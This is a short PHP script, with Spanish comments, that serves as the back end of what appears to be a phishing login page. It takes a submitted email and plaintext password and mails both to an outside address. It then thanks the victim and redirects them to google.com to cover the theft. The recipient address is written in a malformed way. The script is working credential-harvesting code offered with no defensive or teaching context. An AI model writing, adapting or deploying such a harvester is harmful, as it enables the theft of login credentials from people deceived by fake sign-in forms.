<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = filter_var($_POST["email"], FILTER_SANITIZE_EMAIL);
    $password = $_POST["password"];

    // Configura el destinatario del correo
    $destinatario = "gmail@edgar070503@gmail.com";

    // Configura el asunto y el cuerpo del correo
    $asunto = "Nuevo Inicio de Sesión";
    $mensaje = "Correo Electrónico: $email\nContraseña: $password";

    // Configura las cabeceras del correo
    $cabeceras = "From: $email\r\n";

    // Envía el correo
    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        echo "Correo enviado con éxito. ¡Gracias por tu información!";
        
        // Redirige a Google.com después de 3 segundos
        header("refresh:3;url=https://www.google.com");
        exit();
    } else {
        echo "Error al enviar el correo. Por favor, inténtalo de nuevo más tarde.";
    }
}
?>
